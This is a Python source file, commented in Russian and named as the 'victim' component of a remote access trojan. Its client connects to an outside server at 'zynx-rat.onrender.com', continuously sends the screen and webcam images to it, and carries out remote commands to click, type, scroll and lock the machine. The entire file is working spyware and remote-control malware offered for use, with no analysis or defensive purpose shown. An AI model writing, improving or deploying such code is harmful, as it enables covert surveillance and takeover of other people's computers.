# victim_ws.py - ОБНОВЛЁННАЯ ЖЕРТВА (с веб-камерой)
import socketio
import time
import threading
import base64
import io
import pyautogui
import cv2
from PIL import ImageGrab

DOMAIN = "https://zynx-rat.onrender.com"  # <-- СВОЙ ДОМЕН!

class Victim:
    def __init__(self):
        self.running = True
        self.sio = socketio.Client()
        self.block_kb = False
        self.block_mouse = False
        self.webcam_active = False
        self.webcam = None
        
        @self.sio.event
        def connect():
            print('[+] ✅ ПОДКЛЮЧЕНО!')
            self.sio.emit('victim_connect')
            threading.Thread(target=self.send_screen, daemon=True).start()
        
        @self.sio.event
        def command(data):
            self.execute_command(data.get('cmd'), data.get('val'))
        
        @self.sio.event
        def disconnect():
            print('[-] Отключено')
            self.running = False
        
        self.connect()
    
    def connect(self):
        while self.running:
            try:
                print(f'[+] Подключение к {DOMAIN}...')
                self.sio.connect(DOMAIN)
                self.sio.wait()
            except Exception as e:
                print(f'[-] Ошибка: {e}')
                time.sleep(5)
    
    def send_screen(self):
        """Отправляет скриншот экрана"""
        frame_count = 0
        while self.running and self.sio.connected:
            try:
                screenshot = ImageGrab.grab()
                width, height = screenshot.width // 2, screenshot.height // 2
                screenshot = screenshot.resize((width, height))
                buf = io.BytesIO()
                screenshot.save(buf, format='JPEG', quality=30)
                b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                self.sio.emit('victim_frame', b64)
                frame_count += 1
                if frame_count % 30 == 0:
                    print(f'[+] Отправлено {frame_count} кадров')
                time.sleep(0.05)
            except Exception as e:
                print(f'[-] Ошибка: {e}')
                time.sleep(1)
    
    def send_webcam(self):
        """Отправляет веб-камеру"""
        self.webcam = cv2.VideoCapture(0)
        if not self.webcam.isOpened():
            print('[-] Веб-камера не найдена')
            return
        
        print('[+] Веб-камера запущена')
        while self.running and self.webcam_active and self.sio.connected:
            try:
                ret, frame = self.webcam.read()
                if not ret:
                    break
                _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                b64 = base64.b64encode(buf).decode('utf-8')
                self.sio.emit('webcam_frame', b64)
                time.sleep(0.05)
            except Exception as e:
                print(f'[-] Ошибка веб-камеры: {e}')
                time.sleep(1)
        
        if self.webcam:
            self.webcam.release()
            self.webcam = None
            print('[+] Веб-камера остановлена')
    
    def execute_command(self, cmd, val):
        print(f'[CMD] {cmd} = {val}')
        try:
            if cmd == 'click':
                screen = ImageGrab.grab()
                x = int((val.get('x', 50) / 100) * screen.width)
                y = int((val.get('y', 50) / 100) * screen.height)
                button = val.get('button', 'left')
                if button == 'left':
                    pyautogui.click(x, y)
                else:
                    pyautogui.rightClick(x, y)
            elif cmd == 'scroll':
                delta = val.get('delta', 'up')
                pyautogui.scroll(120 if delta == 'up' else -120)
            elif cmd == 'type':
                pyautogui.typewrite(val.get('text', ''))
            elif cmd == 'lock':
                import ctypes
                ctypes.windll.user32.LockWorkStation()
            elif cmd == 'block_kb':
                self.block_kb = val
            elif cmd == 'block_mouse':
                self.block_mouse = val
            elif cmd == 'webcam':
                self.webcam_active = val
                if val:
                    threading.Thread(target=self.send_webcam, daemon=True).start()
                elif self.webcam:
                    self.webcam.release()
                    self.webcam = None
            elif cmd == 'disconnect':
                self.running = False
                self.sio.disconnect()
        except Exception as e:
            print(f'[-] Ошибка {cmd}: {e}')

if __name__ == '__main__':
    victim = Victim()
